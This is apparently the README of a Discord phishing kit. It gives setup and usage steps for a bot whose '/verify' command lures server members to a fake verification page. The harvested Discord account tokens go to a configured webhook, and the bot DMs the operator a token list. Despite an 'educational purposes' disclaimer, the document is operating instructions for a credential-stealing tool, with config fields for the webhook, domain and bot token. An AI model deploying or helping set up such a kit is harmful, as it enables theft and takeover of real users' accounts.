<p align="center">
  <img src="https://cdn.discordapp.com/emojis/1150748295405240350.webp?size=96&quality=lossless" width="100" height="auto">
  <br>
  <a href="https://t.me/lofygang">Telegram Group</a>
</p>

### Disclaimer

* ⚠ This project was created exclusively for educational and research purposes. I am not responsible for any misuse of this tool.

---

### Demonstration

Watch the video below for a complete demonstration of the phishing page:

[Video Link](https://streamable.com/jc7bys)

---

### Installation

1. Run `npm i` to install all required dependencies.

---

### Configuration

This code automatically starts both the bot and server simultaneously for testing and research purposes. Ensure that you have a domain configured and a registered Discord bot, as both are necessary for proper operation.

Before running the code, open the `config.json` file and configure it as shown in the example below:

```json
{
  "webhook": "Enter here the webhook URL that will receive the information",
  "domain": {
    "url": "Enter here the domain (e.g., https://your-domain.com)"
  },
  "bot": {
    "token": "Your Discord bot token",
    "clientid": "Your bot's client ID",
    "guildid": "The ID of the server where commands will be registered"
  },
  "owner": {
    "id": "Your Discord user ID with permission to use the commands"
  },
  "profile": {
    "pfp": {
      "alter": "Set to true if you want the code to automatically set a profile picture",
      "changed": false
    }
  }
}
```

---

### Enabling Bot Intents

For the bot to function correctly, you need to enable all intents in the Discord Developer Portal. Here’s how:

1. Go to the [Discord Developer Portal](https://discord.com/developers/applications).
2. Select your bot application.
3. Navigate to **Bot** in the sidebar.
4. Under **Privileged Gateway Intents**, enable **Presence Intent**, **Server Members Intent**, and **Message Content Intent**.
5. Save your changes.

---

### Usage

After configuring `config.json`, start the code with the command:

```
node main.js
```

In the Discord server, use the command:

```
/verify
```

The bot will send an embed message in the channel where the command was used. Click "verify" and then "click here" to access the test page.

To send the token list, use the command:

```
/help
```

The bot will send a `token.txt` file with the token list to your Discord DM.

---

### Conclusion

* This project was developed for learning and research in digital security, covering both Discord bot functionality and web server simulation.
* If you encounter any issues or have questions, reach out on Telegram: [t.me/oppolar](https://t.me/oppolar).